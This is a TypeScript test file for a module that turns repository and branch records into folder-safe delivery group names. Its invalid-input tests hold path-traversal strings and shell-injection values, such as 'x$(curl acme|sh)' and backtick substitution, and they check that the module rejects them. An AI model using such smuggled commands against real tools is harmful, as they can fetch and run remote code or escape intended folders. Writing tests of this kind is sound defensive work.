import { describe, expect, test } from "bun:test";

import type { DeliveryRecord } from "../record";
import { deliveryGroupFor, isDeliveryGroup, repositorySegment } from "./naming";

function record(deliveries: DeliveryRecord["deliveries"]): DeliveryRecord {
  return { version: 1, change: "acme-login", deliveries };
}

describe("deliveryGroupFor", () => {
  test("names the group after the repository and the recorded Delivery Branch", () => {
    const result = deliveryGroupFor(
      "acme-login",
      record([{ repository: "acme/product", branch: "workset/acme-login" }]),
    );
    expect(result).toEqual({ group: "acme_product/workset/acme-login" });
  });

  test("keeps two repositories with the same branch name apart", () => {
    const group = (repository: string): string =>
      deliveryGroupFor("acme-login", record([{ repository, branch: "workset/acme-login" }])).group;
    expect(group("acme/widgets")).toBe("acme_widgets/workset/acme-login");
    expect(group("Acme/Gadgets")).toBe("acme_gadgets/workset/acme-login");
  });

  test("keeps a ticket prefix as recorded", () => {
    const result = deliveryGroupFor(
      "acme-login",
      record([{ repository: "acme/product", branch: "workset/ABC-123-acme-login" }]),
    );
    expect(result.group).toBe("acme_product/workset/ABC-123-acme-login");
  });

  test("uses change/<name> without a branch", () => {
    expect(deliveryGroupFor("acme-glossary", null).group).toBe("change/acme-glossary");
    expect(
      deliveryGroupFor(
        "acme-glossary",
        record([{ repository: "acme/product", notApplicable: "spec only" }]),
      ).group,
    ).toBe("change/acme-glossary");
    expect(deliveryGroupFor("acme-login", record([])).group).toBe("change/acme-login");
  });

  test("prefers the first scoped repository and warns about differing branches", () => {
    const result = deliveryGroupFor(
      "acme-login",
      record([
        { repository: "acme/api", branch: "workset/acme-api" },
        { repository: "acme/web", branch: "workset/acme-login" },
      ]),
      ["acme/web", "acme/api"],
    );
    expect(result.group).toBe("acme_web/workset/acme-login");
    expect(result.warning).toContain("workset/acme-api, workset/acme-login");
  });

  test("does not warn when every repository records the same branch", () => {
    const result = deliveryGroupFor(
      "acme-login",
      record([
        { repository: "acme/api", branch: "workset/acme-login" },
        { repository: "acme/web", branch: "workset/acme-login" },
      ]),
    );
    expect(result.warning).toBeUndefined();
  });
});

describe("deliveryGroupFor and invalid branch names", () => {
  test("a recorded value that is no branch name never names a folder", () => {
    for (const branch of ["../../../../tmp/acme", "/acme", "acme/../../x", "acme//x"]) {
      const result = deliveryGroupFor(
        "acme-login",
        record([{ repository: "acme/product", branch }]),
      );
      expect(result.group).toBe("change/acme-login");
      expect(result.warning).toContain("no valid branch name");
    }
  });

  test("a valid branch wins over an invalid one", () => {
    const result = deliveryGroupFor(
      "acme-login",
      record([
        { repository: "acme/api", branch: "../acme" },
        { repository: "acme/web", branch: "workset/acme-login" },
      ]),
    );
    expect(result.group).toBe("acme_web/workset/acme-login");
  });

  test("a branch or repository with shell syntax never names a group", () => {
    for (const entry of [
      { repository: "acme/product", branch: "workset/$(touch-acme)" },
      { repository: "x$(curl acme|sh)", branch: "workset/acme-login" },
      { repository: "acme/product", branch: "workset/`acme`" },
    ]) {
      const result = deliveryGroupFor("acme-login", record([entry]));
      expect(result.group).toBe("change/acme-login");
    }
  });

  test("a repository read as an option never names a group", () => {
    const result = deliveryGroupFor(
      "acme-login",
      record([{ repository: "--all/x", branch: "workset/acme-login" }]),
    );
    expect(result.group).toBe("change/acme-login");
    expect(isDeliveryGroup("--all_x/workset/acme-login")).toBe(false);
  });
});

describe("repositorySegment", () => {
  test("never names the current or a parent folder", () => {
    expect(repositorySegment("..")).toBe("_..");
    expect(repositorySegment(".")).toBe("_.");
  });

  test("names a repository as the companion's repos/ folders do", () => {
    expect(repositorySegment("acme/widgets")).toBe("acme_widgets");
    expect(repositorySegment("Acme/Widgets")).toBe("acme_widgets");
  });

  test("never names the branch-less namespace", () => {
    expect(repositorySegment("Change")).toBe("_change");
  });
});

describe("isDeliveryGroup", () => {
  test("accepts only a group with a repository or change segment", () => {
    expect(isDeliveryGroup("acme_widgets/workset/acme-login")).toBe(true);
    expect(isDeliveryGroup("change/acme-glossary")).toBe(true);
    expect(isDeliveryGroup("acme/x")).toBe(true);
    expect(isDeliveryGroup("acme-login")).toBe(false);
    expect(isDeliveryGroup("change/")).toBe(false);
    expect(isDeliveryGroup("acme/../workset")).toBe(false);
    expect(isDeliveryGroup("acme_product/$(touch acme)")).toBe(false);
  });
});
